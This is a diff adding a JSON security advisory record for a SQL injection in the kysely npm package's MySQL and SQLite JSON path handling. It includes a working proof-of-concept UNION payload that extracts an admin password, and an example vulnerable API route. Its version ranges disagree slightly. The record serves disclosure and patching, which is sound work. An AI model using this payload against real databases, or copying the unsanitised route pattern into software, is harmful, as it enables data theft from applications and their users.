@@ -1,0 +1,56 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-03-18T12:59:35Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "kysely"
+  },
+  "Advisory": {
+    "DatabaseId": 343261,
+    "Id": "GSA_kwCzR0hTQS13bXJmLWh2NnctbXI2Ns4ABTzd",
+    "GhsaId": "GHSA-wmrf-hv6w-mr66",
+    "References": [
+      {
+        "Url": "https://github.com/kysely-org/kysely/security/advisories/GHSA-wmrf-hv6w-mr66"
+      },
+      {
+        "Url": "https://github.com/kysely-org/kysely/commit/0a602bff2f442f6c26d5e047ca8f8715179f6d24"
+      },
+      {
+        "Url": "https://github.com/kysely-org/kysely/releases/tag/v0.28.12"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-wmrf-hv6w-mr66"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-wmrf-hv6w-mr66"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-32763"
+      }
+    ],
+    "Description": "### Summary\n\nKysely through 0.28.11 has a SQL injection vulnerability in JSON path compilation for MySQL and SQLite dialects. The `visitJSONPathLeg()` function appends user-controlled values from `.key()` and `.at()` directly into single-quoted JSON path string literals (`'$.key'`) without escaping single quotes. An attacker can break out of the JSON path string context and inject arbitrary SQL.\n\nThis is inconsistent with `sanitizeIdentifier()`, which properly doubles delimiter characters for identifiers — both are non-parameterizable SQL constructs requiring manual escaping, but only identifiers are protected.\n\n### Details\n\n`visitJSONPath()` wraps JSON path in single quotes (`'$...'`), and `visitJSONPathLeg()` appends each key/index value via `this.append(String(node.value))` with no sanitization:\n\n```javascript\n// dist/cjs/query-compiler/default-query-compiler.js\nvisitJSONPath(node) {\n    if (node.inOperator) {\n        this.visitNode(node.inOperator);\n    }\n    this.append(\"'$\");\n    for (const pathLeg of node.pathLegs) {\n        this.visitNode(pathLeg);        // Each leg appended without escaping\n    }\n    this.append(\"'\");\n}\nvisitJSONPathLeg(node) {\n    const isArrayLocation = node.type === 'ArrayLocation';\n    this.append(isArrayLocation ? '[' : '.');\n    this.append(String(node.value));    // \u003c-- NO single quote escaping\n    if (isArrayLocation) {\n        this.append(']');\n    }\n}\n```\n\nContrast with `sanitizeIdentifier()` in the same file, which properly doubles delimiter characters:\n\n```javascript\nsanitizeIdentifier(identifier) {\n    const leftWrap = this.getLeftIdentifierWrapper();\n    const rightWrap = this.getRightIdentifierWrapper();\n    let sanitized = '';\n    for (const c of identifier) {\n        sanitized += c;\n        if (c === leftWrap) { sanitized += leftWrap; }\n        else if (c === rightWrap) { sanitized += rightWrap; }\n    }\n    return sanitized;\n}\n```\n\nBoth identifiers and JSON path keys are non-parameterizable SQL constructs that require manual escaping. Identifiers are protected; JSON path values are not.\n\nPostgreSQL is **not affected**. The branching happens in `JSONPathBuilder.#createBuilderWithPathLeg()` (`json-path-builder.js`):\n\n- **MySQL/SQLite** operators (`-\u003e$`, `-\u003e\u003e$`) produce a `JSONPathNode` traversal → `visitJSONPathLeg()` concatenates the key directly into a single-quoted JSON path string (`'$.key'`) — **vulnerable**, no escaping.\n- **PostgreSQL** operators (`-\u003e`, `-\u003e\u003e`) produce a `JSONOperatorChainNode` traversal → `ValueNode.createImmediate(value)` → `appendImmediateValue()` → `appendStringLiteral()` → **`sanitizeStringLiteral()` doubles single quotes** (`'` → `''`), generating chained operators (`\"col\"-\u003e\u003e'city'`). Injection payload becomes a harmless string literal.\n\nSame `.key()` call, different internal node creation depending on the operator type. The PostgreSQL path reuses the existing string literal sanitization; the MySQL/SQLite JSON path construction bypasses it entirely.\n\n### PoC\n\nEnd-to-end proof against a real SQLite database (Kysely 0.28.11 + better-sqlite3):\n\n```javascript\nconst Database = require('better-sqlite3');\nconst { Kysely, SqliteDialect } = require('kysely');\n\nconst sqliteDb = new Database(':memory:');\nsqliteDb.exec(`\n  CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, profile TEXT);\n  INSERT INTO users VALUES (1, 'alice', '{\"city\": \"Seoul\", \"age\": 30}');\n  INSERT INTO users VALUES (2, 'bob', '{\"city\": \"Tokyo\", \"age\": 25}');\n  CREATE TABLE admin (id INTEGER PRIMARY KEY, password TEXT);\n  INSERT INTO admin VALUES (1, 'SUPER_SECRET_PASSWORD_123');\n`);\n\nconst db = new Kysely({ dialect: new SqliteDialect({ database: sqliteDb }) });\n\nasync function main() {\n  // Safe usage\n  const safe = await db\n    .selectFrom('users')\n    .select(eb =\u003e eb.ref('profile', '-\u003e\u003e$').key('city').as('city'))\n    .execute();\n  console.log(\"Safe:\", safe);\n  // [ { city: 'Seoul' }, { city: 'Tokyo' } ]\n\n  // Injection via .key() — exfiltrate admin password\n  const malicious = `city' as \"city\" from \"users\" UNION SELECT password FROM admin -- `;\n  const attack = await db\n    .selectFrom('users')\n    .select(eb =\u003e eb.ref('profile', '-\u003e\u003e$').key(malicious).as('city'))\n    .execute();\n  console.log(\"Injected:\", attack);\n  // [ { city: 'SUPER_SECRET_PASSWORD_123' }, { city: 'Seoul' }, { city: 'Tokyo' } ]\n}\nmain();\n```\n\nThe payload includes `as \"city\" from \"users\"` to complete the first SELECT before the UNION. The `--` comments out the trailing `' as \"city\" from \"users\"` appended by Kysely.\n\nGenerated SQL:\n\n```sql\nselect \"profile\"-\u003e\u003e'$.city' as \"city\" from \"users\" UNION SELECT password FROM admin -- ' as \"city\" from \"users\"\n```\n\n### Realistic application pattern\n\n```javascript\napp.get('/api/products', async (req, res) =\u003e {\n  const field = req.query.field || 'name';\n  const products = await db\n    .selectFrom('products')\n    .select(eb =\u003e eb.ref('metadata', '-\u003e\u003e$').key(field).as('value'))\n    .execute();\n  res.json(products);\n});\n```\n\nDynamic JSON field selection is a common pattern in search APIs, GraphQL resolvers, and admin panels that expose JSON column data.\n\n### Suggested fix\n\nEscape single quotes in JSON path values within `visitJSONPathLeg()`, similar to how `sanitizeIdentifier()` doubles delimiter characters. Alternatively, validate that JSON path keys contain only safe characters. The direction of the fix is left to the maintainers.\n\n### Impact\n\n**SQL Injection (CWE-89)** — An attacker can inject arbitrary SQL via crafted JSON key names passed to `.key()` or `.at()`, enabling UNION-based data exfiltration from any database table. MySQL and SQLite dialects are affected. PostgreSQL is not affected.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-03-18T12:59:32Z",
+    "Severity": "HIGH",
+    "Summary": "SQL Injection via unsanitized JSON path keys when ignoring/silencing compilation errors or using `Kysely\u003cany\u003e`.",
+    "UpdatedAt": "2026-03-18T12:59:35Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.2,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.28.12"
+      },
+      "VulnerableVersionRange": "\u003e= 0.26.0, \u003c 0.28.11"
+    }
+  ]
+}
